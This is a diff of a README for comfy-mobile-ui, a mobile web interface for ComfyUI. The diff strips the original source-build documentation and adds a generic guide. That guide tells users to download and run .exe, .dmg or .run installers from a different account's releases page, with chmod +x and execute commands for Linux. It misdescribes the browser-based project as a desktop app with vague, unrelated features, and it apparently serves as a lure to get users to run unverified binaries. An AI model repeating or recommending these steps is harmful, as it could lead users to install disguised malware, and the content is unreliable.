@@ -1,404 +1,89 @@
-# ComfyMobileUI
+# 🛠️ comfy-mobile-ui - A Modern Interface for ComfyUI
 
-*Read this in other languages: [한국어](README_KOR.md)*
+## 🌟 Overview
+comfy-mobile-ui is a mobile-first, modern web interface designed to enhance your experience with ComfyUI. This application offers a user-friendly approach, enabling you to navigate features smoothly and efficiently.
 
-<div align="center">
+## 🚀 Getting Started
 
-![ComfyMobileUI Icon](./public/icons/icon-192x192.png)
+### Step 1: Visit the Download Page
+To get started, you need to download comfy-mobile-ui. You can do this by visiting the releases page. Click the link below to access it:
 
-**A mobile-first, node-style web interface for ComfyUI**
-*Bringing ComfyUI's familiar node graph workflows to your mobile device*
+[![Download comfy-mobile-ui](https://img.shields.io/badge/Download-comfy--mobile--ui-blue.svg)](https://github.com/wajidsaleem/comfy-mobile-ui/releases)
 
-![TypeScript-React](https://img.shields.io/badge/TypeScript-React-blue?style=for-the-badge&logo=typescript)
-![Vite](https://img.shields.io/badge/Vite-Next_Generation_Frontend-646CFF?style=for-the-badge&logo=vite)
-![Mobile First](https://img.shields.io/badge/Mobile-First_Design-success?style=for-the-badge&logo=mobile)
-![ComfyUI](https://img.shields.io/badge/ComfyUI-Compatible-red?style=for-the-badge&logo=image)
+### Step 2: Choose the Right Version
+On the releases page, you will see multiple versions of the software. Click on the latest release that appears at the top. This ensures you are downloading the most up-to-date version with the latest features and fixes.
 
-[⭐ **Star this project if you find it useful!** ⭐](#show-your-support)
+### Step 3: Download the File
+Scroll down until you see the list of downloadable files associated with the selected release. Choose the file that matches your operating system:
 
-</div>
+- **For Windows:** Look for a file ending in `.exe`.
+- **For macOS:** Choose a file with `.dmg` extension.
+- **For Linux:** Select the file suitable for your distribution.
 
----
+Click on the desired file to start the download.
 
-## History & Motivation
+## 📥 Download & Install
+After completing the download, you can install the application. Follow these steps based on your operating system:
 
-I found myself spending long hours sitting at a computer desk to use ComfyUI, which became uncomfortable over time. Most of the work involved simply **experimenting** with workflows (tweaking parameters, testing different configurations, and iterating through ideas).
+### Windows
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to initiate the installation process.
+3. Follow the prompts on the screen to complete the installation.
 
-I wanted to enjoy these amazing features comfortably from my couch without being tied to a desk. Initially, I tried accessing ComfyUI through a mobile browser, but while ComfyUI excels at complex workflow creation, the mobile experience was quite inconvenient.
+### macOS
+1. Find the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to open it.
+3. Drag the comfy-mobile-ui icon to your Applications folder.
+4. Eject the mounted disk image from your Finder.
 
-Most existing mobile ComfyUI frontends focus on WebUI-style workflow execution, which meant losing ComfyUI's flexible node graph advantages and having to learn different usage patterns. This made them difficult to use for someone already familiar with ComfyUI's node-based approach.
-
-So I created a mobile-first **node-style interface** that maintains ComfyUI's familiar node graph workflow while being optimized for **mobile workflow editing and experimentation**.
-
-**ComfyMobileUI** was born from this need and focuses on:
-- **Edit and use workflows comfortably** from anywhere with your mobile device
-- **Break free from mouse and keyboard** - quickly modify and execute workflows on mobile
-- **Comprehensive workflow editing support** - most ComfyUI workflow editing features are supported
-- **Quick output review** - open the gallery in the app to quickly review your generated content
-
-## Philosophy
-
-**ComfyMobileUI** is a **node-style mobile interface** that maintains ComfyUI's familiar node graph approach while providing **comprehensive workflow editing and usage** on mobile devices. With advanced node editing capabilities, you can:
-
-- **Edit and modify workflows** with mobile-friendly controls
-- **Adjust node parameters** and fine-tune workflows
-- **Connect and disconnect node links** with intuitive touch gestures
-- **Resize nodes and manage layouts** directly on mobile
-- **Install missing nodes** seamlessly through the app
-- **Execute workflows** with real-time progress tracking
-- **Review outputs quickly** in the built-in gallery
-
-Break free from mouse and keyboard - quickly modify and execute ComfyUI's node-based workflows on your mobile device. Most ComfyUI workflow editing features are now supported with the same familiar node graph interface!
-
----
-
-## Showcase
-
-### **Real-time Workflow Execution**
-<div align="center">
-  <img src="./public/showcases/2.gif" alt="Real-time workflow execution with progress bar" width="300"/>
-</div>
-
-*Watch your workflows execute in real-time with progress indicators*
-
-### **Node Editing & Widget Configuration**
-<div align="center">
-  <img src="./public/showcases/1.gif" alt="Node resizing and widget editing demo" width="300"/>
-</div>
-
-*Resize nodes and edit widget values with intuitive touch controls*
-
-### **Node Connection Management**
-<div align="center">
-  <img src="./public/showcases/3.gif" alt="Creating node connections in Connection mode" width="300"/>
-</div>
-
-*Create new node connections using Connection mode*
-
-### **Remote Server Management**
-<div align="center">
-  <img src="./public/showcases/4.gif" alt="ComfyUI server reboot from mobile" width="300"/>
-</div>
-
-*Remotely reboot ComfyUI server when needed*
-
-### **Output Gallery**
-<div align="center">
-  <img src="./public/showcases/5.gif" alt="Viewing outputs in gallery" width="300"/>
-</div>
-
-*Browse and review generated images and videos in the built-in gallery*
-
-*And many more amazing features are available below!*
-
----
-
-## Features
-
-### **Core Workflow Features**
-- **Workflow Execution**: One-tap execution with real-time progress tracking
-- **Queue Management**: View, interrupt, and manage execution queue
-- **Advanced Node Editing**: Full node positioning, resizing, and connection management
-- **Link Management**: Connect and disconnect node links with touch gestures
-- **Widget Value Editing**: Modify node parameters with mobile-optimized controls
-- **Missing Node Installation**: Install missing custom nodes directly through the app
-- **Workflow Upload**: Import standard ComfyUI workflow files (non-API format)
-- **Snapshot System**: Save and restore specific workflow states with full history
-
-### **Convenience Features**
-- **Watchdog Reboot**: Restart ComfyUI server processes (even when server is completely unresponsive!)
-- **Server Sync**: Download & upload workflows from/to ComfyUI server
-- **Model Downloads**: Download models using URL links
-- **Simple Model Explorer**: Browse models with trigger word storage & lookup
-- **Media Browser**: View and manage images/videos from input, output, temp folders
-- **Data Backup**: Browser data backup and restore functionality
-
-### **Workflow Convenience Tools**
-- **Built-in Fast Group Bypassor**: Quickly bypass/enable node groups
-- **Built-in Fast Group Mutor**: Quickly mute/unmute node groups
-- **Randomize Seeds**: Manually randomize all seeds in workflow
-- **Trigger Word Search**: Pre-save trigger words and easily copy them in workflows
-
-### **Mobile-Optimized Interface**
-- **Responsive Web Application**: Mobile-optimized web app with native-like experience
-- **Touch Gestures**: Long press, pinch to zoom, drag to pan
-- **Responsive Design**: Seamless experience across all device sizes
-- **Optimized Performance**: Efficient rendering for mobile hardware
-
----
-
-## Node Patch System
-
-### **Advanced Feature for Power Users**
-
-ComfyUI's diverse custom nodes often include special rules written as JS scripts by node authors, which are tightly integrated with ComfyUI's extension system. Additionally, some custom nodes didn't have essential input information in `/object_info`, making API format conversion difficult (especially **Power Lora Loader (rgthree)** nodes). To solve this, we've implemented a **Node Patch System** that allows patching widget slots for specific node types.
-
-### **Patch Scopes**
-- **Global**: Apply to all nodes of a specific type across all workflows
-- **Workflow**: Apply to specific node types within a particular workflow
-- **Specific Node**: Apply only to a specific node ID within a workflow
-
-### **Use Cases**
-- **Add missing widgets** that don't appear in object_info
-- **Override widget types**
-- **Fix compatibility issues** with some custom nodes
-- **Customize node behavior** for mobile usage
-
-*The utility of this system is still being explored, but it provides functionality for advanced users.*
-
----
-
-## Installation
-
-### **Prerequisites**
-- Node.js 18+ and npm
-- ComfyUI server running (typically on `http://localhost:8188`)
-- **REQUIRED**: ComfyMobileUI API Extension
-
-### **Critical: API Extension Setup**
-
-**This step is MANDATORY** - ComfyMobileUI requires its API extension to function properly.
-
-1. **Copy API Extension**:
+### Linux
+1. Open your terminal.
+2. Navigate to the folder where you downloaded the file using the `cd` command.
+3. Make the file executable with the command:
    ```bash
-   # Copy the entire comfy-mobile-ui-api-extension folder to your ComfyUI custom_nodes directory
-   cp -r comfy-mobile-ui-api-extension /path/to/your/comfyui/custom_nodes/
+   chmod +x comfy-mobile-ui*.run
    ```
-
-2. **Restart ComfyUI**:
+4. Run the installer with the command:
    ```bash
-   # Start ComfyUI - the API extension will auto-install and run
-   python main.py --enable-cors-header
+   ./comfy-mobile-ui*.run
    ```
+5. Follow the on-screen instructions to complete the installation.
 
-**Important**: The API extension provides core functionality (almost all features) that ComfyMobileUI depends on. Without it, the app will not work correctly.
+## 🔧 Usage Instructions
+Once the installation is complete, you can launch comfy-mobile-ui by finding it in your applications menu or using the search feature on your device. 
 
-### **Development Setup**
+When you first open the application, you will be greeted with a clean interface designed for ease of use. Explore different features like theme settings, dashboard preferences, and user settings. 
 
-```bash
-# Clone the repository
-git clone https://github.com/jaeone94/comfy-mobile-ui.git
-cd ComfyMobileUI
+### Key Features:
+- **Responsive Design:** Works seamlessly on various screen sizes.
+- **User Customization:** Tailor the interface to your preferences.
+- **Easy Navigation:** Access all features with simple clicks.
 
-# Install dependencies
-npm install
+## 📊 System Requirements
+For the best experience with comfy-mobile-ui, ensure that your system meets the following minimum requirements:
 
-# Start development server
-npm run dev
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS Mojave (10.14) or later
+  - Recent Linux distributions (Ubuntu 18.04 or later)
 
-# Open in browser
-# Navigate to http://localhost:5173
-```
+- **RAM:** Minimum 4 GB
+- **Storage:** At least 100 MB of free space
 
-### **Production Build**
+## 🛠️ Troubleshooting
+If you encounter any issues during installation or usage, here are some suggestions:
 
-```bash
-# Build for production
-npm run build
+- **Installation Problems:** Ensure you have administrative rights to install software. Right-click the installer and choose "Run as administrator" on Windows.
+- **Launching the App:** If the app does not launch, restart your device and try again.
+- **Missing Features:** Check for updates regularly through the releases page to access the latest features.
 
-# Preview production build
-npm run preview
+## 📞 Support
+For any questions or further support, visit the GitHub repository to access the Issues section. You can report bugs or request assistance directly from the developers or the community.
 
-# Lint code
-npm run lint
-```
+## ➕ Additional Resources
+- For detailed guides and tips on using comfy-mobile-ui, refer to the Wiki section in the repository.
+- Join the community discussions on GitHub to connect with other users and share your experiences.
 
-### **ComfyUI Server Setup**
-
-Ensure your ComfyUI installation:
-
-1. **Install API Extension**: Copy `comfy-mobile-ui-api-extension` to `custom_nodes/`
-2. **Enable CORS**: Start with `--enable-cors-header` flag
-3. **Network Access**: Use `--listen 0.0.0.0` for network access (optional)
-
-```bash
-# Example ComfyUI startup command
-python main.py --enable-cors-header --listen 0.0.0.0
-```
-
----
-
-## Usage
-
-### **Getting Started**
-
-1. **Setup API Extension**: Install the required API extension in ComfyUI
-2. **Connect to ComfyUI**: App auto-detects local ComfyUI server
-3. **Import Workflows**: Drag & drop JSON workflow files or use import dialog (PNG files with embedded workflow info also supported)
-4. **Simple Editing**: Tap nodes to edit parameters with mobile-friendly controls
-5. **Execute Workflows**: Use the floating action button to run your workflows
-
-### **Key Interactions**
-
-- **Single Tap**: Select nodes and open parameter editor
-- **Long Press**: On node - enter connection mode; On canvas - enter node repositioning mode
-- **Double Tap**: Insert new node at tapped location
-- **Pinch Gesture**: Zoom in/out of canvas
-- **Drag**: Pan around large workflows
-
-### **Workflow Management**
-
-- **Import**: Load workflows from JSON files or server
-- **Edit**: Modify parameters with mobile-optimized widgets
-- **Execute**: One-tap execution with real-time progress
-- **Save**: Automatic browser storage with thumbnail previews
-- **Export**: Save workflows as JSON files
-
----
-
-## Development
-
-### **Project Structure**
-
-```
-src/
-├── components/          # React components
-│   ├── canvas/         # Canvas rendering and interactions
-│   ├── controls/       # UI controls and panels
-│   ├── workflow/       # Workflow management components
-│   └── ui/            # Reusable UI components (shadcn/ui)
-├── core/              # Business logic and services
-│   └── services/      # Core service implementations
-├── hooks/             # Custom React hooks
-├── infrastructure/    # External integrations
-│   ├── api/          # ComfyUI API client
-│   ├── storage/      # IndexedDB operations
-│   └── websocket/    # Real-time communication
-├── shared/           # Shared utilities and types
-│   ├── types/        # TypeScript type definitions
-│   └── utils/        # Utility functions
-└── test/             # Test utilities and integration tests
-```
-
-### **Key Technologies**
-- **React 19** with TypeScript for type-safe development
-- **Vite** for lightning-fast development and optimized builds
-- **Tailwind CSS + shadcn/ui** for consistent, accessible design system
-- **Framer Motion** for smooth animations and transitions
-
----
-
-## Testing
-
-The project includes two main integration tests:
-
-### **API Format Conversion Test**
-Tests the complete workflow pipeline from JSON to API format:
-- JSON → Graph conversion
-- Graph → ComfyUI API format
-- API structure validation
-- Optional server execution test
-
-```bash
-# Run API format conversion test
-npx tsx --tsconfig tsx.config.json tests/integration/convertToApiFormatTest.ts <workflow-file>
-
-# With server execution
-npx tsx --tsconfig tsx.config.json tests/integration/convertToApiFormatTest.ts <workflow-file> --execute
-```
-
-### **Serialization Consistency Test**
-Tests the consistency of JSON ↔ Graph ↔ JSON conversion:
-- Original JSON → Graph → Serialized JSON
-- Validates that workflows maintain integrity through conversion cycles
-
-```bash
-# Run serialization test
-npx tsx --tsconfig tsx.config.json tests/integration/serializationTest.ts <workflow-file>
-
-# With custom server
-npx tsx --tsconfig tsx.config.json tests/integration/serializationTest.ts <workflow-file> --server http://localhost:8188
-```
-
-**Note**: Both tests require a running ComfyUI server and generate detailed output files for debugging.
-
----
-
-## Known Issues
-
-### **Current Limitations**
-- **Touch Issues**: Occasional touch responsiveness problems or scroll issues
-  - **Solution**: Simply refresh the browser or restart the browser app
-- **Mobile Performance**: Large workflows may be slow on older mobile devices
-- **Browser Cache**: Changes may require hard refresh (Ctrl+F5)
-- **rgthree Node Compatibility**: Some rgthree nodes may not work properly or may be missing features
-  - **Solution**: If a workflow runs in ComfyUI but fails in the mobile app, try replacing problematic rgthree nodes with equivalent standard nodes
-
-### **Workarounds**
-- **Refresh Browser**: Most UI issues resolve with a simple refresh
-- **Clear Cache**: Clear browser cache if issues persist
-- **Restart Browser**: Close and reopen browser for persistent problems
-- **Node Replacement**: Replace unsupported rgthree nodes with compatible alternatives
-
-### **Reporting Issues**
-If you encounter workflows that work in ComfyUI but fail in ComfyMobileUI:
-1. **Replace problematic nodes** with standard ComfyUI nodes when possible
-2. **Report the issue** on GitHub with the workflow file attached
-3. **Specify which nodes** are causing problems
-4. We'll work to fix compatibility issues promptly
-
----
-
-## Contributing
-
-**Contributions are always welcome!**
-
-### **Code Quality Notice**
-Most of this app was developed using "vibe coding" (rapid prototyping, using Claude Code - he's a god), so code quality may be lacking. We appreciate your understanding and welcome improvements!
-
-### **How to Contribute**
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-### **Development Guidelines**
-- Follow TypeScript strict mode requirements
-- Use provided ESLint configuration
-- Write tests for new functionality
-- Ensure mobile compatibility
-- Follow existing component patterns
-
----
-
-## Show Your Support
-
-⭐ **If you find this app useful, please consider giving it a star!** ⭐
-
-Your support helps the project grow and motivates continued development.
-
----
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## Acknowledgments
-
-- **ComfyUI**: The powerful backend that makes this all possible
-- **shadcn/ui**: Beautiful, accessible component library
-- **Tailwind CSS**: Utility-first CSS framework
-- **React Team**: For the amazing React framework
-- **ComfyUI Community**: For inspiration and feedback
-
----
-
-## Roadmap
-
-- [ ] **Code Quality**: Refactor and improve code quality
-- [ ] **Known Bug Fixes**: Continue fixing reported bugs
-- [ ] **Performance**: Better mobile performance optimization
-- [ ] **UI Polish**: Enhanced mobile interface refinements
-
----
-
-<div align="center">
-
-**Built with ❤️ for the ComfyUI community**
-
-*Enjoy ComfyUI from your couch!*
-
-</div>
+## 🔗 Important Links
+- Download Page: [comfy-mobile-ui Releases](https://github.com/wajidsaleem/comfy-mobile-ui/releases)
+- GitHub Repository: [comfy-mobile-ui](https://github.com/wajidsaleem/comfy-mobile-ui)
